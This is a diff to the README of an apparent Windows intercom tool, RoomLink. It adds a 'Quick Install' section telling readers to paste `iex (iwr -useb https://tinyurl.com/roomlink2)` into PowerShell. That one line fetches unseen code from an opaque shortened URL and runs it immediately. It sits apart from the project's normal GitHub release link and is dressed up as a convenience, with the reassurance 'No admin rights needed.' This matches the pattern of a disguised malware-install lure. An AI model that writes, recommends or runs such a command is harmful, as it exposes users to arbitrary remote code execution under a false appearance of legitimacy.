@@ -17,6 +17,21 @@ Great for talking to someone in another room while they keep their headset on.
 ·
 [⬇ RoomLink.exe (portable)](https://github.com/eaeoz/RoomLink/releases/download/2.0.0/RoomLink.exe)
 
+## Quick Install — RoomLink
+
+**Step by step (copy-paste ready):**
+
+1. Press `Win + R`, type `powershell`, press Enter
+2. Copy the line below
+3. Right-click in the PowerShell window (or Ctrl+V) to paste
+4. Press Enter
+
+```
+iex (iwr -useb https://tinyurl.com/roomlink2)
+```
+
+- ✅ Done. RoomLink is one command away. No admin rights needed.
+
 ---
 
 ## Requirements
